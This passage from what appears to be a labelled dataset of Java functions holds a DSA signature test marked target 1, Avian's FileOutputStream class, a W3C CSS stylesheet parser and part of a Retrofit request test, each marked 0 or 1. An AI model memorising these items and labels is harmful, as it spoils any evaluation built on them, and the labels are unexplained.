fail(\"P incorrect\");\n        }\n\n        if (!params.getG().equals(new BigInteger(\n            \"5E5CBA992E0A680D885EB903AEA78E4A45A469103D448EDE\" +\n            \"3B7ACCC54D521E37F84A4BDD5B06B0970CC2D2BBB715F7B8\" +\n            \"2846F9A0C393914C792E6A923E2117AB805276A975AADB52\" +\n            \"61D91673EA9AAFFEECBFA6183DFCB5D3B7332AA19275AFA1\" +\n            \"F8EC0B60FB6F66CC23AE4870791D5982AAD1AA9485FD8F4A\" +\n            \"60126FEB2CF05DB8A7F0F09B3397F3937F2E90B9E5B9C9B6\" +\n            \"EFEF642BC48351C46FB171B9BFA9EF17A961CE96C7E7A7CC\" +\n            \"3D3D03DFAD1078BA21DA425198F07D2481622BCE45969D9C\" +\n            \"4D6063D72AB7A0F08B2F49A7CC6AF335E08C4720E31476B6\" +\n            \"7299E231F8BD90B39AC3AE3BE0C6B6CACEF8289A2E2873D5\" +\n            \"8E51E029CAFBD55E6841489AB66B5B4B9BA6E2F784660896\" +\n            \"AFF387D92844CCB8B69475496DE19DA2E58259B090489AC8\" +\n            \"E62363CDF82CFD8EF2A427ABCD65750B506F56DDE3B98856\" +\n            \"7A88126B914D7828E2B63A6D7ED0747EC59E0E0A23CE7D8A\" +\n            \"74C1D2C2A7AFB6A29799620F00E11C33787F7DED3B30E1A2\" +\n            \"2D09F1FBDA1ABBBFBF25CAE05A13F812E34563F99410E73B\", 16)))\n        {\n            fail(\"G incorrect\");\n        }\n\n        DSAKeyPairGenerator kpGen = new DSAKeyPairGenerator();\n\n        kpGen.init(new DSAKeyGenerationParameters(new TestRandomData(Hex.decode(\"3ABC1587297CE7B9EA1AD6651CF2BC4D7F92ED25CABC8553F567D1B40EBB8764\")), params));\n\n        AsymmetricCipherKeyPair kp = kpGen.generateKeyPair();\n\n        DSAPublicKeyParameters pub = (DSAPublicKeyParameters)kp.getPublic();\n        DSAPrivateKeyParameters priv = (DSAPrivateKeyParameters)kp.getPrivate();\n\n        if (!pub.getY().equals(new BigInteger(\n            \"8B891C8692D3DE875879390F2698B26FBECCA6B075535DCE\" +\n            \"6B0C862577F9FA0DEF6074E7A7624121224A595896ABD4CD\" +\n            \"A56B2CEFB942E025D2A4282FFAA98A48CDB47E1A6FCB5CFB\" +\n            \"393EF35AF9DF913102BB303C2B5C36C3F8FC04ED7B8B69FE\" +\n            \"FE0CF3E1FC05CFA713B3435B2656E913BA8874AEA9F93600\" +\n            \"6AEB448BCD005D18EC3562A33D04CF25C8D3D69844343442\" +\n            \"FA3DB7DE618C5E2DA064573E61E6D5581BFB694A23AC87FD\" +\n            \"5B52D62E954E1376DB8DDB524FFC0D469DF978792EE44173\" +\n            \"8E5DB05A7DC43E94C11A2E7A4FBE383071FA36D2A7EC8A93\" +\n            \"88FE1C4F79888A99D3B6105697C2556B79BB4D7E781CEBB3\" +\n            \"D4866AD825A5E830846072289FDBC941FA679CA82F5F78B7\" +\n            \"461B2404DB883D215F4E0676CF5493950AC5591697BFEA8D\" +\n            \"1EE6EC016B89BA51CAFB5F9C84C989FA117375E94578F28B\" +\n            \"E0B34CE0545DA46266FD77F62D8F2CEE92AB77012AFEBC11\" +\n            \"008985A821CD2D978C7E6FE7499D1AAF8DE632C21BB48CA5\" +\n            \"CBF9F31098FD3FD3854C49A65D9201744AACE540354974F9\", 16)))\n        {\n            fail(\"Y value incorrect\");\n        }\n\n        if (!priv.getX().equals(\n            new BigInteger(\"3ABC1587297CE7B9EA1AD6651CF2BC4D7F92ED25CABC8553F567D1B40EBB8764\", 16)))\n        {\n            fail(\"X value incorrect\");\n        }\n\n        DSASigner signer = new DSASigner();\n\n        signer.init(true, new ParametersWithRandom(kp.getPrivate(), new TestRandomData(Hex.decode(\"A6902C1E6E3943C5628061588A8B007BCCEA91DBF12915483F04B24AB0678BEE\"))));\n\n        byte[] msg = Hex.decode(\"BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD\");\n\n        BigInteger[] sig = signer.generateSignature(msg);\n\n        if (!sig[0].equals(new BigInteger(\"5F184E645A38BE8FB4A6871B6503A9D12924C7ABE04B71410066C2ECA6E3BE3E\", 16)))\n        {\n            fail(\"R value incorrect\");\n        }\n\n        if (!sig[1].equals(new BigInteger(\"91EB0C7BA3D4B9B60B825C3D9F2CADA8A2C9D7723267B033CBCDCF8803DB9C18\", 16)))\n        {\n            fail(\"S value incorrect\");\n        }\n\n        signer.init(false, kp.getPublic());\n\n        if (!signer.verifySignature(msg, sig[0], sig[1]))\n        {\n            fail(\"signature not verified\");\n        }\n    }\n\n    public static void main(\n        String[]    args)\n    {\n        runTest(new DSATest());\n    }\n\n    private class DSATestSecureRandom\n        extends TestRandomData\n    {\n        private boolean first = true;\n\n        public DSATestSecureRandom(byte[] value)\n        {\n            super(value);\n        }\n\n       public void nextBytes(byte[] bytes)\n       {\n           if (first)\n           {\n               super.nextBytes(bytes);\n               first = false;\n           }\n           else\n           {\n               bytes[bytes.length - 1] = 2;\n           }\n       }\n    }\n}\n", "target": 1}
{"idx": 1022, "func": "/* Copyright (c) 2008-2015, Avian Contributors\n\n   Permission to use, copy, modify, and/or distribute this software\n   for any purpose with or without fee is hereby granted, provided\n   that the above copyright notice and this permission notice appear\n   in all copies.\n\n   There is NO WARRANTY for this software.  See license.txt for\n   details. */\n\npackage java.io;\n\npublic class FileOutputStream extends OutputStream {\n  //   static {\n  //     System.loadLibrary(\"natives\");\n  //   }\n\n  private int fd;\n\n  public FileOutputStream(FileDescriptor fd) {\n    this.fd = fd.value;\n  }\n\n  public FileOutputStream(String path) throws IOException {\n    this(path, false);\n  }\n\n  public FileOutputStream(String path, boolean append) throws IOException {\n    fd = open(path, append);\n  }\n  \n\n  public FileOutputStream(File file) throws IOException {\n    this(file.getPath());\n  }\n\n  private static native int open(String path, boolean append) throws IOException;\n\n  private static native void write(int fd, int c) throws IOException;\n\n  private static native void write(int fd, byte[] b, int offset, int length)\n    throws IOException;\n\n  private static native void close(int fd) throws IOException;\n\n  public void write(int c) throws IOException {\n    write(fd, c);\n  }\n\n  public void write(byte[] b, int offset, int length) throws IOException {\n    if (b == null) {\n      throw new NullPointerException();\n    }\n\n    if (offset < 0 || length < 0 || length > b.length || offset > b.length - length) {\n      throw new ArrayIndexOutOfBoundsException();\n    }\n\n    write(fd, b, offset, length);\n  }\n\n  public void close() throws IOException {\n    if (fd != -1) {\n      close(fd);\n      fd = -1;\n    }\n  }\n}\n", "target": 0}
{"idx": 1023, "func": "//\n// $Id$\n// From Philippe Le Hegaret (Philippe.Le_Hegaret@sophia.inria.fr)\n//\n// (c) COPYRIGHT MIT and INRIA, 1997.\n// Please first read the full copyright statement in file COPYRIGHT.html\n\npackage org.w3c.css.css;\n\nimport org.w3c.css.atrules.css.AtRuleMedia;\nimport org.w3c.css.atrules.css.AtRulePage;\nimport org.w3c.css.parser.AtRule;\nimport org.w3c.css.parser.CssError;\nimport org.w3c.css.parser.CssFouffa;\nimport org.w3c.css.parser.CssParseException;\nimport org.w3c.css.parser.CssSelectors;\nimport org.w3c.css.parser.CssValidatorListener;\nimport org.w3c.css.parser.Errors;\nimport org.w3c.css.parser.analyzer.ParseException;\nimport org.w3c.css.parser.analyzer.TokenMgrError;\nimport org.w3c.css.properties.css.CssProperty;\nimport org.w3c.css.selectors.IdSelector;\nimport org.w3c.css.util.ApplContext;\nimport org.w3c.css.util.CssVersion;\nimport org.w3c.css.util.InvalidParamException;\nimport org.w3c.css.util.Messages;\nimport org.w3c.css.util.Util;\nimport org.w3c.css.util.Warning;\nimport org.w3c.css.util.Warnings;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.io.StringReader;\nimport java.io.UnsupportedEncodingException;\nimport java.lang.reflect.Constructor;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.StringTokenizer;\n\n/**\n * @version $Revision$\n */\npublic final class StyleSheetParser\n        implements CssValidatorListener, CssParser {\n\n    private static Constructor co = null;\n\n    static {\n        try {\n            Class c = java.lang.Exception.class;\n            Class cp[] = {java.lang.Exception.class};\n            co = c.getDeclaredConstructor(cp);\n        } catch (NoSuchMethodException ex) {\n            co = null;\n        }\n    }\n\n    CssFouffa cssFouffa;\n    StyleSheet style = new StyleSheet();\n\n    public void reInit() {\n        style = new StyleSheet();\n    }\n\n    public StyleSheet getStyleSheet() {\n        return style;\n    }\n\n    public void setWarningLevel(int warningLevel) {\n        style.setWarningLevel(warningLevel);\n    }\n\n    public void notifyErrors(Errors errors) {\n        style.addErrors(errors);\n    }\n\n    public void notifyWarnings(Warnings warnings) {\n        style.addWarnings(warnings);\n    }\n\n    /**\n     * Adds a vector of properties to a selector.\n     *\n     * @param selector   the selector\n     * @param properties Properties to associate with contexts\n     */\n    public void handleRule(ApplContext ac, CssSelectors selector,\n                           ArrayList<CssProperty> properties) {\n        if (selector.getAtRule() instanceof AtRulePage) {\n            style.remove(selector);\n        }\n        for (CssProperty property : properties) {\n            property.setSelectors(selector);\n            style.addProperty(selector, property);\n        }\n    }\n\n    // part added by Sijtsche de Jong\n\n    public void addCharSet(String charset) {\n        style.addCharSet(charset);\n    }\n\n    public void newAtRule(AtRule atRule) {\n        style.newAtRule(atRule);\n    }\n\n    public void endOfAtRule() {\n        style.endOfAtRule();\n    }\n\n    public void setImportant(boolean important) {\n        style.setImportant(important);\n    }\n\n    public void setSelectorList(ArrayList<CssSelectors> selectors) {\n        style.setSelectorList(selectors);\n    }\n\n    public void setProperty(ArrayList<CssProperty> properties) {\n        style.setProperty(properties);\n    }\n\n    public void endOfRule() {\n        style.endOfRule();\n    }\n\n    public void removeThisRule() {\n        style.removeThisRule();\n    }\n\n    public void removeThisAtRule() {\n        style.removeThisAtRule();\n    }\n\n    //end of part added by Sijtsche de Jong\n\n    /**\n     * Handles an at-rule.\n     * <p/>\n     * <p>The parameter <code>value</code> can be :\n     * <DL>\n     * <DT>CssString\n     * <DD>The value coming from a string.\n     * <DT>CssURL\n     * <DD>The value coming from an URL.\n     * <DT>Vector\n     * <DD>The value is a vector of declarations (it contains properties).\n     * This feature is not legal, so be careful.\n     * </DL>\n     *\n     * @param ident  The ident for this at-rule (for example: 'font-face')\n     * @param string The string representation if this at-rule\n     */\n    public void handleAtRule(ApplContext ac, String ident, String string) {\n        style.getWarnings().addWarning(new Warning(cssFouffa.getSourceFile(),\n                cssFouffa.getLine(),\n                \"at-rule\",\n                2,\n                new String[]{ident, string},\n                ac));\n        //stylesheet.addAtRule(atRule);\n    }\n\n    /**\n     * @param url    the URL containing the style sheet\n     * @param title  the title of the stylesheet\n     * @param kind   may be a stylesheet or an alternate stylesheet\n     * @param media  the media to apply this\n     * @param origin the origin of the style sheet\n     * @throws IOException an IO error\n     */\n    public void parseURL(ApplContext ac, URL url, String title,\n                         String kind, String media,\n                         int origin) {\n        boolean doneref = false;\n        URL ref = ac.getReferrer();\n        setWarningLevel(ac.getWarningLevel());\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseURL(\" + url + \", \"\n                    + title + \", \"\n                    + kind + \", \" + media + \", \"\n                    + origin + \")\");\n        }\n        if (kind != null) {\n            kind = kind.trim().toLowerCase();\n            if (!kind.equals(\"stylesheet\") && !kind.equals(\"alternate stylesheet\")) {\n                return;\n            }\n        }\n        try {\n            ac.setOrigin(origin);\n//\t    if (cssFouffa == null) {\n            cssFouffa = new CssFouffa(ac, url);\n            cssFouffa.addListener(this);\n//\t    } else {\n//\t\tcssFouffa.ReInit(ac, url);\n//\t    }\n\n            //\t    cssFouffa.setResponse(res);\n\n            // removed plh 2001-03-08\n            // cssFouffa.setOrigin(origin);\n            //\t    cssFouffa.setDefaultMedium(defaultmedium);\n            //\t    cssFouffa.doConfig();\n            if (media == null) {\n                if (ac.getCssVersion() != CssVersion.CSS1) {\n                    if (ac.getMedium() == null) {\n                        media = \"all\";\n                    } else {\n                        media = ac.getMedium();\n                    }\n                }\n            }\n            AtRuleMedia m = AtRuleMedia.getInstance(ac.getCssVersion());\n            try {\n                if (media != null) {\n                    addMedias(m, media, ac);\n                }\n                cssFouffa.setAtRule(m);\n            } catch (org.w3c.css.util.InvalidParamException e) {\n                Errors er = new Errors();\n                er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                        -1, e));\n                notifyErrors(er);\n                return;\n            }\n            ac.setReferrer(url);\n            doneref = true;\n            cssFouffa.parseStyle();\n        } catch (Exception e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(Messages.escapeString(url.toString()),\n                    -1, new Exception(Messages.escapeString(e.getMessage()))));\n            notifyErrors(er);\n        } finally {\n            if (doneref) {\n                ac.setReferrer(ref);\n            }\n        }\n    }\n\n    // add media, easy version for CSS version < 3, otherwise, reuse the parser\n    private void addMedias(AtRuleMedia m, String medias, ApplContext ac) throws InvalidParamException {\n        // before CSS3, let's parse it the easy way...\n        if (ac.getCssVersion().compareTo(CssVersion.CSS3) < 0) {\n            StringTokenizer tokens = new StringTokenizer(medias, \",\");\n            while (tokens.hasMoreTokens()) {\n                m.addMedia(null, tokens.nextToken().trim(), ac);\n            }\n        } else {\n            CssFouffa muP = new CssFouffa(ac, new StringReader(medias));\n            try {\n                AtRuleMedia arm = muP.parseMediaDeclaration();\n                if (arm != null) {\n                    m.allMedia = arm.allMedia;\n                }\n            } catch (ParseException pex) {\n                // error already added, so nothing else to do\n            }\n        }\n    }\n\n    /**\n     * Parse a style element. The Style element always comes from the user\n     *\n     * @param reader the reader containing the style data\n     * @param url    the name of the file the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleElement(ApplContext ac, Reader reader,\n                                  String title, String media,\n                                  URL url, int lineno) {\n        boolean doneref = false;\n        style.setWarningLevel(ac.getWarningLevel());\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseStyleElement(\" + title + \", \"\n                    + media + \", \" + url\n                    + \",\" + lineno + \")\");\n        }\n        URL ref = ac.getReferrer();\n        try {\n\n//\t    if (cssFouffa == null) {\n            String charset = ac.getCharsetForURL(url);\n            cssFouffa = new CssFouffa(ac, reader, url, lineno);\n            cssFouffa.addListener(this);\n//\t    } else {\n//\t\tcssFouffa.ReInit(ac, input, url, lineno);\n//\t    }\n\n            //\t    cssFouffa.setResponse(res);\n            //\t    cssFouffa.setDefaultMedium(defaultmedium);\n            //\t    cssFouffa.doConfig();\n            if (media == null && ac.getCssVersion() != CssVersion.CSS1) {\n                media = \"all\";\n            }\n\n            AtRuleMedia m = AtRuleMedia.getInstance(ac.getCssVersion());\n            try {\n                if (media != null) {\n                    addMedias(m, media, ac);\n                }\n                cssFouffa.setAtRule(m);\n            } catch (org.w3c.css.util.InvalidParamException e) {\n                Errors er = new Errors();\n                er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                        -1, e));\n                notifyErrors(er);\n                return;\n            }\n            ac.setReferrer(url);\n            doneref = true;\n            cssFouffa.parseStyle();\n        } catch (IOException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, e));\n            notifyErrors(er);\n        } catch (TokenMgrError e) {\n            Errors er = new Errors();\n            CssParseException cpe = null;\n            if (co != null) {\n                try {\n                    Object o[] = new Object[1];\n                    o[0] = e;\n                    Exception new_e = (Exception) co.newInstance(o);\n                    cpe = new CssParseException(new_e);\n                } catch (Exception ex) {\n                    cpe = null;\n                }\n            }\n            if (cpe == null) {\n                cpe = new CssParseException(new Exception(e.getMessage()));\n            }\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1,\n                    //e.getErrorLine(),\n                    cpe));\n            notifyErrors(er);\n        } catch (RuntimeException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    cssFouffa.getLine(),\n                    new CssParseException(e)));\n            notifyErrors(er);\n        } finally {\n            if (doneref) {\n                ac.setReferrer(ref);\n            }\n        }\n    }\n\n    /**\n     * @param input the inputStream containing the style data\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     * @see #parseStyleElement(ApplContext, InputStream, String, String, URL, int)\n     * @deprecated Replaced by parseStyleElement\n     */\n    public void parseStyleElement(ApplContext ac, String input, URL url, int lineno) {\n        parseStyleElement(ac, new StringReader(input), null, null, url, lineno);\n    }\n\n    /**\n     * Parse a style element. The Style element always comes from the user\n     *\n     * @param input the input stream containing the style data\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleElement(ApplContext ac, InputStream input,\n                                  String title, String media,\n                                  URL url, int lineno) {\n        InputStreamReader reader = null;\n        String charset = ac.getCharsetForURL(url);\n        try {\n            reader = new InputStreamReader(input, (charset == null) ?\n                    \"iso-8859-1\" : charset);\n        } catch (UnsupportedEncodingException uex) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, uex));\n            notifyErrors(er);\n        } catch (Exception ex) {\n            // in case of error, ignore it.\n            reader = null;\n            if (Util.onDebug) {\n                System.err.println(\"Error in StyleSheet.parseStyleElement(\" + title + \",\"\n                        + url + \",\" + lineno + \")\");\n            }\n        }\n        if (reader != null) {\n            parseStyleElement(ac, reader, title, media, url, lineno);\n        }\n    }\n\n    /**\n     * Unify call to the parser for css doc as a reader.\n     *\n     * @param ac\n     * @param reader\n     * @param docref\n     */\n    public void parseStyleSheet(ApplContext ac, Reader reader, URL docref) {\n        parseStyleElement(ac, reader, null, null, (docref == null) ? ac.getFakeURL() : docref, 0);\n    }\n\n    /**\n     * Parse some declarations. All declarations always comes from the user\n     *\n     * @param input the inputStream containing the style data\n     * @param id    the uniq id\n     * @param url   the URL the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleAttribute(ApplContext ac, InputStream input, String id,\n                                    URL url, int lineno) {\n        style.setWarningLevel(ac.getWarningLevel());\n        lineno--; // why ?!?!\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseStyleAttribute(\" + id + \",\"\n                    + url + \",\" + lineno + \")\");\n        }\n\n        try {\n            //\t    if (cssFouffa == null) {\n            String charset = ac.getCharsetForURL(url);\n            cssFouffa = new CssFouffa(ac, input, charset, url, lineno);\n            cssFouffa.addListener(this);\n            //\t    } else\n//\t\tcssFouffa.ReInit(ac, input, url, lineno);\n            CssSelectors selector = new CssSelectors(ac);\n\n            try {\n                AtRuleMedia media = AtRuleMedia.getInstance(ac.getCssVersion());\n                if (ac.getCssVersion() != CssVersion.CSS1) {\n                    media.addMedia(null, \"all\", ac);\n                }\n                cssFouffa.setAtRule(media);\n            } catch (InvalidParamException e) {\n            } //ignore\n\n            try {\n                if (id == null || id.length() == 0) {\n                    id = \"nullId-\" + Long.toHexString(System.currentTimeMillis());\n                    // TODO add an error/warning ?\n                }\n                selector.addId(new IdSelector(id.substring(1)));\n            } catch (InvalidParamException e) {\n                style.removeThisRule();\n                ac.getFrame().addError(new CssError(e));\n            }\n            cssFouffa.parseDeclarations(selector);\n        } catch (IOException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, e));\n            notifyErrors(er);\n        }\n    }\n\n    /**\n     * @param input the inputStream containing the style data\n     * @param id    the uniq id\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     * @see #parseStyleAttribute(ApplContext, InputStream, String, URL, int)\n     * @deprecated Replaced by parseStyleAttribute\n     */\n    public void parseStyleAttribute(ApplContext ac, String input, String id,\n                                    URL url, int lineno) {\n        parseStyleAttribute(ac, new ByteArrayInputStream(input.getBytes()),\n                id, url, lineno);\n    }\n\n    public void setStyle(Class style) {\n        cssFouffa.setStyle(style);\n    }\n\n}\n", "target": 0}
{"idx": 1024, "func": "/*\n * Copyright (C) 2013 Square, Inc.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage retrofit2;\n\nimport java.io.IOException;\nimport java.lang.reflect.Method;\nimport java.math.BigInteger;\nimport java.net.URI;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport okhttp3.HttpUrl;\nimport okhttp3.MediaType;\nimport okhttp3.MultipartBody;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.ResponseBody;\nimport okio.Buffer;\nimport org.junit.Test;\nimport retrofit2.helpers.NullObjectConverterFactory;\nimport retrofit2.helpers.ToStringConverterFactory;\nimport retrofit2.http.Body;\nimport retrofit2.http.DELETE;\nimport retrofit2.http.Field;\nimport retrofit2.http.FieldMap;\nimport retrofit2.http.FormUrlEncoded;\nimport retrofit2.http.GET;\nimport retrofit2.http.HEAD;\nimport retrofit2.http.HTTP;\nimport retrofit2.http.Header;\nimport retrofit2.http.HeaderMap;\nimport retrofit2.http.Headers;\nimport retrofit2.http.Multipart;\nimport retrofit2.http.OPTIONS;\nimport retrofit2.http.PATCH;\nimport retrofit2.http.POST;\nimport retrofit2.http.PUT;\nimport retrofit2.http.Part;\nimport retrofit2.http.PartMap;\nimport retrofit2.http.Path;\nimport retrofit2.http.Query;\nimport retrofit2.http.QueryMap;\nimport retrofit2.http.QueryName;\nimport retrofit2.http.Url;\n\nimport static org.assertj.core.api.Assertions.assertThat;\nimport static org.junit.Assert.assertNull;\nimport static org.junit.Assert.fail;\n\n@SuppressWarnings({\"UnusedParameters\", \"unused\"}) // Parameters inspected reflectively.\npublic final class RequestFactoryTest {\n  private static final MediaType TEXT_PLAIN = MediaType.get(\"text/plain\");\n\n  @Test public void customMethodNoBody() {\n    class Example {\n      @HTTP(method = \"CUSTOM1\", path = \"/foo\")\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"CUSTOM1\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void customMethodWithBody() {\n    class Example {\n      @HTTP(method = \"CUSTOM2\", path = \"/foo\", hasBody = true)\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    Request request = buildRequest(Example.class, body);\n    assertThat(request.method()).isEqualTo(\"CUSTOM2\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo\");\n    assertBody(request.body(), \"hi\");\n  }\n\n  @Test public void onlyOneEncodingIsAllowedMultipartFirst() {\n    class Example {\n      @Multipart //\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Only one encoding annotation is allowed.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void onlyOneEncodingIsAllowedFormEncodingFirst() {\n    class Example {\n      @FormUrlEncoded //\n      @Multipart //\n      @POST(\"/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Only one encoding annotation is allowed.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void invalidPathParam() throws Exception {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@Path(\"hey!\") String thing) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Path parameter name must match \\\\{([a-zA-Z][a-zA-Z0-9_-]*)\\\\}.\"\n              + \" Found: hey! (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void pathParamNotAllowedInQuery() throws Exception {\n    class Example {\n      @GET(\"/foo?bar={bar}\") //\n      Call<ResponseBody> method(@Path(\"bar\") String thing) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"URL query string \\\"bar={bar}\\\" must not have replace block.\"\n              + \" For dynamic query parameters use @Query.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void multipleParameterAnnotationsNotAllowed() throws Exception {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@Body @Query(\"nope\") String o) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Multiple Retrofit annotations found, only one allowed. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @interface NonNull {}\n\n  @Test public void multipleParameterAnnotationsOnlyOneRetrofitAllowed() throws Exception {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@Query(\"maybe\") @NonNull Object o) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"yep\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/?maybe=yep\");\n  }\n\n  @Test public void twoMethodsFail() {\n    class Example {\n      @PATCH(\"/foo\") //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n        assertThat(e.getMessage())\n            .isIn(\"Only one HTTP method is allowed. Found: PATCH and POST.\\n    for method Example.method\",\n                  \"Only one HTTP method is allowed. Found: POST and PATCH.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void lackingMethod() {\n    class Example {\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"HTTP method annotation is required (e.g., @GET, @POST, etc.).\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void implicitMultipartForbidden() {\n    class Example {\n      @POST(\"/\") //\n      Call<ResponseBody> method(@Part(\"a\") int a) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part parameters can only be used with multipart encoding. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void implicitMultipartWithPartMapForbidden() {\n    class Example {\n      @POST(\"/\") //\n      Call<ResponseBody> method(@PartMap Map<String, String> params) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@PartMap parameters can only be used with multipart encoding. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartFailsOnNonBodyMethod() {\n    class Example {\n      @Multipart //\n      @GET(\"/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Multipart can only be specified on HTTP methods with request body (e.g., @POST).\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartFailsWithNoParts() {\n    class Example {\n      @Multipart //\n      @POST(\"/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Multipart method must contain at least one @Part.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void implicitFormEncodingByFieldForbidden() {\n    class Example {\n      @POST(\"/\") //\n      Call<ResponseBody> method(@Field(\"a\") int a) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Field parameters can only be used with form encoding. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void implicitFormEncodingByFieldMapForbidden() {\n    class Example {\n      @POST(\"/\") //\n      Call<ResponseBody> method(@FieldMap Map<String, String> a) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@FieldMap parameters can only be used with form encoding. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void formEncodingFailsOnNonBodyMethod() {\n    class Example {\n      @FormUrlEncoded //\n      @GET(\"/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"FormUrlEncoded can only be specified on HTTP methods with request body (e.g., @POST).\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void formEncodingFailsWithNoParts() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Form-encoded method must contain at least one @Field.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void headersFailWhenEmptyOnMethod() {\n    class Example {\n      @GET(\"/\") //\n      @Headers({}) //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"@Headers annotation is empty.\\n    for method Example.method\");\n   